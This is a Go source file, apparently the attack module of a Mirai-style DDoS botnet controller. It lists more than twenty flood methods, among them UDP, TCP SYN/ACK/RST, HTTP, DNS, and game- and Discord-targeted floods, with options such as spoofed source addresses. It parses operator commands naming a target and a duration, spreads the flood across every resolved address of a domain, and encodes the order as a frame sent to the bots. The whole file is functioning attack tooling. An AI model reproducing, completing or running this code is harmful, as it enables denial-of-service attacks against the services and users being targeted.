package main

// attack.go — attack types, command parsing, wire Build(), whitelist filter.

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"sort"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Name     string
	Target   string // first target as display string (ip or domain)
	Targets  map[uint32]uint8
	Flags    map[uint8]string
	Domain   string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup = map[string]FlagInfo{
	"size": {0, "payload size (bytes)"},
	"rand": {1, "randomize payload (0/1)"},
	"tos": {2, "ip tos"},
	"ident": {3, "ip ident"},
	"ttl": {4, "ip ttl"},
	"df": {5, "dont-fragment"},
	"sport": {6, "source port"},
	"port": {7, "dest port"},
	"domain": {8, "domain name"},
	"dhid": {9, "dns id"},
	"urg": {11, "urg flag"},
	"ack": {12, "ack flag"},
	"psh": {13, "psh flag"},
	"rst": {14, "rst flag"},
	"syn": {15, "syn flag"},
	"fin": {16, "fin flag"},
	"seqnum": {17, "tcp seq"},
	"acknum": {18, "tcp ack"},
	"gcip": {19, "gre const ip"},
	"method": {20, "http method"},
	"postdata": {21, "http post data"},
	"path": {22, "http path"},
	"ssl": {23, "https"},
	"threads": {24, "worker threads"},
	"source": {25, "source ip (255.255.255.255 random)"},
	"minlen": {26, "min payload"},
	"maxlen": {27, "max payload"},
	"payload": {28, "custom payload"},
	"repeat": {29, "repeat count"},
	"ratelimit": {30, "rate limit"},
}

var attackInfoLookup = map[string]AttackInfo{
	"udp":       {1, []uint8{0, 1, 7}, "UDP flood"},
	"std":       {2, []uint8{0, 1, 7}, "std UDP flood"},
	"tcp":       {3, []uint8{7, 24}, "TCP connect + payload burst flood"},
	"ack":       {4, []uint8{7, 24}, "TCP connect + 1-byte write + RST flood"},
	"syn":       {5, []uint8{7, 24}, "TCP connect-churn flood"},
	"hex":       {6, []uint8{0, 1, 7}, "HEX flood"},
	"stdhex":    {7, []uint8{0, 6, 7}, "STDHEX flood"},
	"nudp":      {8, []uint8{0, 6, 7}, "NUDP flood"},
	"udphex":    {9, []uint8{8, 7, 20, 21, 22, 24}, "UDPHEX flood"},
	"cudp":      {13, []uint8{0, 1, 7, 26, 27, 28, 29}, "UDP flood with custom payload"},
	"udpbypass": {16, []uint8{0, 1, 7, 24}, "UDP burst flood, fast-switch + burst mix"},
	"tcpbypass": {17, []uint8{7, 8, 20, 22, 24}, "HTTP POST flood with rotating User-Agents"},
	"ssh":       {18, []uint8{7, 24}, "SSH banner + payload flood"},
	"dns":       {19, []uint8{7, 9, 24}, "DNS query flood, rotating domains/qtypes"},
	"minecraft": {20, []uint8{7, 24}, "Minecraft handshake+login flood"},
	"fortnite":  {21, []uint8{7, 24}, "Fortnite-style UDP packet flood"},
	"pps":       {22, []uint8{7, 24}, "max-packet-per-second UDP flood"},
	"tcpstomp":  {23, []uint8{7, 24}, "TCP double-connect stomp flood"},
	"discord":   {24, []uint8{7, 24}, "Discord voice RTP packet flood"},
	"udpburst":  {25, []uint8{0, 1, 7, 24}, "UDP burst flood, random burst size"},
	"ackconn":   {26, []uint8{7, 24}, "TCP connect + 1-byte write + RST flood"},
	"httpgen":  {27, []uint8{7, 8, 22, 24}, "HTTP GET flood, rotating User-Agents"},
	"rst":      {28, []uint8{7, 24}, "TCP connect + immediate RST, max packets per second"},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string) (*Attack, error) {
	atk := &Attack{Targets: make(map[uint32]uint8), Flags: make(map[uint8]string)}
	args, _ := shellwords.Parse(str)

	if len(args) == 0 {
		return nil, errors.New("must specify an attack method")
	}
	atkInfo, exists := attackInfoLookup[args[0]]
	if !exists {
		return nil, errors.New(fmt.Sprintf("%s is not a valid method — try 'methods' or '?'", args[0]))
	}
	atk.Type = atkInfo.attackID
	atk.Name = args[0]
	args = args[1:]

	// target
	if len(args) == 0 {
		return nil, errors.New("must specify a target IP or domain")
	}
	target := args[0]
	netmask := uint8(32)
	if strings.Contains(target, "/") && !strings.Contains(target, "://") {
		parts := strings.SplitN(target, "/", 2)
		ip := net.ParseIP(parts[0])
		if ip == nil {
			return nil, fmt.Errorf("invalid IP: %s", parts[0])
		}
		mask, _ := strconv.Atoi(parts[1])
		netmask = uint8(mask)
		atk.Targets[binary.BigEndian.Uint32(ip.To4())] = netmask
		atk.Target = parts[0]
	} else {
		domain := target
		if strings.Contains(domain, "://") {
			urlParts := strings.SplitN(domain, "://", 2)
			scheme := strings.ToLower(urlParts[0])
			hostPort := urlParts[1]
			host, portStr, _ := net.SplitHostPort(hostPort)
			if host == "" { host = hostPort }
			if scheme == "https" { atk.Flags[23] = "1" }
			if portStr != "" { atk.Flags[7] = portStr }
			domain = host
		}
		atk.Domain = domain
		atk.Target = domain
		ips, err := net.LookupIP(domain)
		if err != nil || len(ips) == 0 {
			return nil, fmt.Errorf("DNS error: %s", domain)
		}
		// Every resolved address becomes a target so the flood lands on all
		// servers/backends of the domain, not just the first one.
		added := false
		for _, ip := range ips {
			if v4 := ip.To4(); v4 != nil {
				atk.Targets[binary.BigEndian.Uint32(v4)] = netmask
				added = true
			}
		}
		if !added {
			return nil, fmt.Errorf("no IPv4 for %s", domain)
		}
	}
	args = args[1:]

	// optional port (numeric arg right after target)
	if len(args) > 0 {
		if _, aerr := strconv.Atoi(args[0]); aerr == nil {
			// could be port or duration — decide by next arg
			if len(args) > 1 {
				if _, derr := strconv.Atoi(args[1]); derr == nil {
					// both numeric: args[0]=port, args[1]=duration
					atk.Flags[7] = args[0]
					args = args[1:]
				}
			}
		}
	}

	// duration
	if len(args) == 0 {
		return nil, errors.New("must specify a duration in seconds")
	}
	duration, err := strconv.Atoi(args[0])
	if err != nil || duration <= 0 || duration > 21600 {
		return nil, errors.New("invalid duration (1-21600 seconds)")
	}
	atk.Duration = uint32(duration)
	args = args[1:]

	// remaining key=value flags
	for len(args) > 0 {
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("invalid key=value near %s", args[0]))
		}
		fi, ok := flagInfoLookup[flagSplit[0]]
		if !ok {
			return nil, errors.New(fmt.Sprintf("invalid flag %s for method %s", flagSplit[0], atk.Name))
		}
		// threads (24) is a global flag usable by every method; all others
		// must be in the method's allowlist.
		if fi.flagID != 24 && !uint8InSlice(fi.flagID, atkInfo.attackFlags) {
			return nil, errors.New(fmt.Sprintf("invalid flag %s for method %s", flagSplit[0], atk.Name))
		}
		v := flagSplit[1]
		if strings.HasPrefix(v, `"`) && len(v) > 1 {
			v = v[1 : len(v)-1]
		}
		if v == "true" { v = "1" } else if v == "false" { v = "0" }
		atk.Flags[fi.flagID] = v
		args = args[1:]
	}

	if atk.Domain != "" && atk.Flags[8] == "" {
		atk.Flags[8] = atk.Domain
	}
	return atk, nil
}

// Build serialises the attack into the shared wire format (same as
// spoofed-main): [u16 len][u32 duration][u8 type][u8 tcount][targets]
// [u8 flagcount][flags...]. Targets are written as 5-byte ip+mask records so
// every bot knows exactly where to send.
func (this *Attack) Build() ([]byte, error) {
	if len(this.Targets) == 0 {
		return nil, errors.New("no targets")
	}
	if len(this.Targets) > 255 {
		return nil, errors.New("max 255 targets")
	}

	// Sort targets so the frame is deterministic (Go map iteration is random).
	type tgt struct{ ip uint32; mask uint8 }
	out := make([]tgt, 0, len(this.Targets))
	for ip, m := range this.Targets {
		out = append(out, tgt{ip, m})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].ip < out[j].ip })

	var buf []byte
	tmp := make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)
	buf = append(buf, byte(this.Type))
	buf = append(buf, byte(len(out)))
	for _, t := range out {
		rec := make([]byte, 5)
		binary.BigEndian.PutUint32(rec, t.ip)
		rec[4] = t.mask
		buf = append(buf, rec...)
	}

	buf = append(buf, byte(len(this.Flags)))
	for key, val := range this.Flags {
		sb := []byte(val)
		if len(sb) > 255 {
			return nil, errors.New("flag value > 255 bytes")
		}
		buf = append(buf, key, byte(len(sb)))
		buf = append(buf, sb...)
	}
	if len(buf) > 4096 {
		return nil, errors.New("max buffer 4096")
	}
	frame := make([]byte, 2)
	binary.BigEndian.PutUint16(frame, uint16(len(buf)+2))
	return append(frame, buf...), nil
}

func (this *Attack) Port() int {
	if v, ok := this.Flags[7]; ok {
		if n, err := strconv.Atoi(v); err == nil {
			return n
		}
	}
	return 0
}